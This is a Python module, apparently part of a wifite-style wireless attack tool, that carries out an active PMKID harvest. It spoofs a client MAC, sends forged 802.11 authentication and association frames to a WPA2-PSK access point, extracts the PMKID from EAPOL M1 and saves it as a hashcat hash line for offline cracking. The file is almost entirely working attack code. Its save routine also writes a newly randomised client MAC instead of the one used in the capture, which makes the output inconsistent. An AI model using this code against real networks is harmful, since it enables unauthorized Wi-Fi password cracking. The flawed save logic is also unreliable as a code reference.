#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""Active PMKID harvest attack using scapy.

Sequence per attempt:
  1. Forge a random locally-administered client MAC.
  2. Send 802.11 Auth Request (Open System) to the AP.
  3. Send 802.11 Assoc Request with an RSN IE forcing AKM=PSK.
  4. Listen for EAPOL M1 from the AP. Many WPA2-PSK APs include a PMKID KDE
     in M1's Key Data field.
  5. If M1 has a PMKID → save it. If PMKID-less M1 → AP doesn't expose PMKIDs
     (don't retry). If AP is silent → rotate MAC and retry.

Falls back to None (caller tries passive hcxdumptool) if scapy is not installed
or if the target is PMF-required or SAE-only.

Ported from wifit3/campaigns/pmkid.py (GPLv2).
"""

from __future__ import annotations

import os
import re
import struct
import time
from typing import Optional

from ..config import Configuration
from ..util.color import Color

# ---------------------------------------------------------------------------
# Scapy availability check — graceful degradation
# ---------------------------------------------------------------------------
try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Auth, Dot11AssoReq, Dot11Elt, EAPOL,
        sniff, sendp, conf as scapy_conf,
    )
    from scapy.layers.dot11 import Dot11EltRSN
    _SCAPY_AVAILABLE = True
except ImportError:
    _SCAPY_AVAILABLE = False


# ---------------------------------------------------------------------------
# RSN IE builder (AKM forced to PSK)
# ---------------------------------------------------------------------------

# Minimal RSN IE: WPA2-Personal, CCMP group+pairwise, AKM=PSK, no PMF
_GENERIC_RSN_IE = bytes([
    0x30, 0x14,        # Tag: RSN, length 20
    0x01, 0x00,        # Version 1
    0x00, 0x0f, 0xac, 0x04,  # Group: CCMP
    0x01, 0x00,        # Pairwise count: 1
    0x00, 0x0f, 0xac, 0x04,  # Pairwise: CCMP
    0x01, 0x00,        # AKM count: 1
    0x00, 0x0f, 0xac, 0x02,  # AKM: PSK
    0x00, 0x00,        # RSN Capabilities: no PMF
])


def _random_client_mac() -> str:
    """Locally-administered unicast MAC (LAA bit set, multicast bit clear)."""
    raw = bytearray(os.urandom(6))
    raw[0] = (raw[0] | 0x02) & 0xFE   # LAA=1, multicast=0
    return ':'.join('%02x' % b for b in raw)


def _mac_bytes(mac: str) -> bytes:
    return bytes(int(b, 16) for b in mac.split(':'))


# ---------------------------------------------------------------------------
# EAPOL M1 PMKID extraction (pure Python, no scapy dependency)
# ---------------------------------------------------------------------------

def _extract_pmkid_from_m1(eapol_payload: bytes) -> Optional[bytes]:
    """Extract the 16-byte PMKID from an EAPOL Key (M1) Key Data field.

    EAPOL Key frame layout (relevant portion):
      [0]    Descriptor Type (2 = RSN EAPOL-Key)
      [1:3]  Key Information
      [3:5]  Key Length
      [5:13] Replay Counter
      [13:45] ANonce
      [45:61] Key IV
      [61:69] Key RSC
      [69:77] Key ID / Reserved
      [77:93] Key MIC (16 bytes)
      [93:95] Key Data Length
      [95:]  Key Data → RSN KDE chain

    PMKID KDE: OUI 00:0f:ac, type 4, 16-byte PMKID.
    """
    # EAPOL header is 4 bytes (version, type, length×2); key frame starts at byte 4
    if len(eapol_payload) < 99:
        return None

    key_data_len = struct.unpack('!H', eapol_payload[93:95])[0]
    key_data_start = 95
    key_data = eapol_payload[key_data_start:key_data_start + key_data_len]

    # Walk RSN KDE list
    pos = 0
    while pos + 6 <= len(key_data):
        kde_type  = key_data[pos]
        kde_len   = key_data[pos + 1]
        if kde_type != 0xdd or kde_len < 4:
            pos += 2 + kde_len
            continue
        kde_oui   = key_data[pos+2:pos+5]
        kde_dtype = key_data[pos+5]
        kde_data  = key_data[pos+6:pos+2+kde_len]
        # PMKID KDE: 00:0f:ac type 4, 16 bytes
        if kde_oui == bytes([0x00, 0x0f, 0xac]) and kde_dtype == 4 and len(kde_data) == 16:
            return bytes(kde_data)
        pos += 2 + kde_len

    return None


# ---------------------------------------------------------------------------
# Main attack class
# ---------------------------------------------------------------------------

class AttackPMKIDActive:
    """Active PMKID harvest: Auth + Assoc → EAPOL M1 capture.

    Requires scapy.  If scapy is absent returns None immediately so the caller
    can fall back to passive hcxdumptool.
    """

    def __init__(self, target, attempts: int = 3, m1_timeout: float = 3.0):
        self.target   = target
        self.attempts = attempts
        self.m1_timeout = m1_timeout
        self.pmkid: Optional[bytes] = None
        self.fail_reason: Optional[str] = None
        self._iface = Configuration.interface

    @staticmethod
    def is_available() -> bool:
        return _SCAPY_AVAILABLE

    def run(self) -> bool:
        """Run the active harvest. Returns True if PMKID was captured."""
        if not _SCAPY_AVAILABLE:
            Color.pl('{!} {O}scapy not found — skipping active PMKID harvest{W}')
            return False

        # Skip PMF-required targets (can't associate without PMF support)
        if getattr(self.target, 'pmf_required', False):
            Color.pl('{!} {O}PMKID active harvest: target requires PMF — skipping{W}')
            self.fail_reason = 'pmf_required'
            return False

        # Skip SAE-only targets (no PSK AKM to harvest)
        has_psk = getattr(self.target, 'has_psk_akm', True)  # default True if unknown
        has_sae = getattr(self.target, 'has_sae_akm', False)
        if has_sae and not has_psk:
            Color.pl('{!} {O}PMKID active harvest: SAE-only AP — no PSK AKM to harvest{W}')
            self.fail_reason = 'sae_only'
            return False

        Color.p('\r{+} {C}PMKID{W} Active harvest: Auth→Assoc→M1 ')

        for attempt in range(1, self.attempts + 1):
            client_mac = _random_client_mac()
            Color.p('\r{+} {C}PMKID{W} Attempt %d/%d (MAC: {C}%s{W}) ' % (
                attempt, self.attempts, client_mac))

            pmkid = self._attempt(client_mac)
            if pmkid is not None:
                self.pmkid = pmkid
                Color.pl('\n{+} {G}PMKID captured!{W} (%s)' % pmkid.hex())
                return True

            if self.fail_reason == 'no_kde':
                # M1 arrived but no PMKID — AP won't expose one, don't retry
                break

        Color.pl('\n{!} {O}Active PMKID harvest failed: %s{W}' % (self.fail_reason or 'no response'))
        return False

    def _attempt(self, client_mac: str) -> Optional[bytes]:
        """One Auth→Assoc attempt. Returns PMKID bytes or None."""
        ap_bssid = self.target.bssid
        channel  = int(self.target.channel)

        try:
            scapy_conf.iface = self._iface
            scapy_conf.verb  = 0

            # ---- Auth Request ----
            auth = (
                RadioTap()
                / Dot11(addr1=ap_bssid, addr2=client_mac, addr3=ap_bssid)
                / Dot11Auth(algo=0, seqnum=1, status=0)
            )
            sendp(auth, iface=self._iface, count=1, verbose=False)

            # ---- Wait for Auth Response ----
            auth_resp = sniff(
                iface=self._iface,
                lfilter=lambda p: (
                    p.haslayer(Dot11Auth)
                    and p[Dot11].addr1 == client_mac
                    and p[Dot11].addr3 == ap_bssid
                    and p[Dot11Auth].seqnum == 2
                ),
                timeout=1.5,
                count=1,
            )
            if not auth_resp:
                self.fail_reason = 'no_response'
                return None

            # ---- Assoc Request with RSN IE (AKM=PSK) ----
            essid = self.target.essid or ''
            assoc = (
                RadioTap()
                / Dot11(addr1=ap_bssid, addr2=client_mac, addr3=ap_bssid)
                / Dot11AssoReq(cap=0x0431, listen_interval=10)
                / Dot11Elt(ID='SSID', info=essid)
                / Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x24\x30\x48\x6c')
                / Dot11Elt(ID=48, info=_GENERIC_RSN_IE[2:])  # RSN IE body (strip tag+len)
            )
            sendp(assoc, iface=self._iface, count=1, verbose=False)

            # ---- Wait for EAPOL M1 ----
            deadline = time.time() + self.m1_timeout
            while time.time() < deadline:
                packets = sniff(
                    iface=self._iface,
                    lfilter=lambda p: (
                        p.haslayer(EAPOL)
                        and p[Dot11].addr1 == client_mac
                        and p[Dot11].addr3 == ap_bssid
                    ),
                    timeout=0.5,
                    count=1,
                )
                if not packets:
                    continue

                # Extract raw EAPOL payload
                eapol_raw = bytes(packets[0][EAPOL])
                pmkid = _extract_pmkid_from_m1(eapol_raw)

                if pmkid is not None:
                    return pmkid

                # M1 arrived but no PMKID KDE
                self.fail_reason = 'no_kde'
                return None

        except Exception as e:
            if Configuration.verbose > 0:
                Color.pl('{!} PMKID active error: %s' % str(e))

        self.fail_reason = 'no_response'
        return None

    def save(self, hs_dir: str) -> Optional[str]:
        """Save captured PMKID as .hc22000 hashline. Returns path or None."""
        if self.pmkid is None:
            return None

        import os, re, time
        from ..util.hc22000 import write_hc22000_pmkid

        if not os.path.exists(hs_dir):
            os.makedirs(hs_dir)

        client_mac = _random_client_mac()
        essid_safe = re.sub('[^a-zA-Z0-9]', '', self.target.essid or 'UnknownESSID')
        bssid_safe = self.target.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        path = os.path.join(
            hs_dir,
            'pmkid_active_%s_%s_%s.hc22000' % (essid_safe, bssid_safe, date),
        )
        write_hc22000_pmkid(path, self.pmkid, self.target.bssid, client_mac,
                             self.target.essid or '')
        Color.pl('{+} {G}Saved PMKID{W} to {C}%s{W}' % path)
        return path
